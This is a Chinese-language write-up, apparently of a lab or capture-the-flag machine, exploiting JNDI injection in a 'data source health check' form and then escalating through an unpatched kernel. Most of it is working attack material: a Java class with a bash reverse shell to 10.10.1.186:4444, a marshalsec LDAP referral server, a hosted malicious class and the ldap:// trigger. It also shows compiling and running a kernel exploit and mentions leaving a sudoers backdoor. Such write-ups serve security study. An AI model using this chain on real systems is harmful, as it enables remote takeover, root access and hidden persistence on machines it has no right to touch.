### **<span style="color:#3498db">JNDI 注入</span>**

首页是一个"数据源健康检查"，让用户输入**资源名（JNDI）**然后点检查：

![mm](/assets/img/2025-07-23-19-13-39.png)

**JNDI（Java 命名与目录接口）**是 Java 统一"查资源"的规范，支持多种协议去拉资源并返回一个对象：

| 协议 | 用途 |
| --- | --- |
| `java:` | Java 本地资源（页面默认的 `java:comp/env/...`） |
| `ldap://` | 轻量目录服务（可以存"引用"，指向远程类） |
| `rmi://` | Java 远程方法调用 |
| `dns://` / `file://` | 域名解析 / 本地文件 |

问题的核心：后端大概率就是这么写的——**`new InitialContext().lookup(用户输入)`**。`lookup` 会按照你给的协议去请求资源并**返回/加载一个对象**，用户可控的 lookup 输入 = **让服务器去我们指定的地方加载对象**。

### **<span style="color:#3498db">利用链</span>**

**1. 写恶意类**——把反弹 shell 放进**静态代码块**（类只要被加载进 JVM 就执行，就算后面实例化失败也不影响）：

```java
public class Exp {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.1.186/4444 0>&1"};
            new ProcessBuilder(cmd).start();
        } catch (Exception e) {}
    }
}
```

**2. 降级编译**——高版本 JDK 编出来的 class，低版本 JVM 直接不认，所以要指定 `-target 1.8 -source 1.8`：

```bash
javac -target 1.8 -source 1.8 Exp.java
```

![mm](/assets/img/2025-07-24-09-18-30.png)

**3. 起"恶意 LDAP 服务"**——用 marshalsec，它收到请求会返回一个 **reference**（告诉 JNDI 客户端：类名叫 `Exp`，去 `http://10.10.1.186:8080/` 下载）：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
  http://10.10.1.186:8080/#Exp 1389
```

![mm](/assets/img/2025-07-24-09-38-21.png)

**4. 托管恶意类**：在 `Exp.class` 所在目录开 `python3 -m http.server 8080`，再开 `nc -lvnp 4444` 监听。

**5. 触发**：输入框里填 `ldap://10.10.1.186:1389/Exp`，点检查。完整链路：

> lookup 请求 → 我们的 LDAP 返回 reference → JNDI 客户端按 reference 去我们的 HTTP 服务器**加载恶意 class** → 类被加载进 JVM，**静态代码块执行** → 反弹 shell。

### **<span style="color:#3498db">内核提权</span>**

常规提权面（sudo、SUID、定时任务、getcap）全空，pspy 盯着也没什么可乘之机。换方向看内核：

```bash
uname -a
```

![mm](/assets/img/2025-07-24-10-22-31.png)

内核是 6.8.0 系列里某个还没打补丁的版本。代理联网下载对应的内核 EXP，本地编译后运行：

```bash
gcc exp.c -o exp -static -O2 -pthread
chmod +x exp && ./exp
```

![mm](/assets/img/2025-07-24-11-17-44.png)

root 到手，往 sudoers 里留了后门。**内核提权的特点：不用特定服务漏洞，只要内核版本"差一个补丁"，整台机器的权限就是你的。**
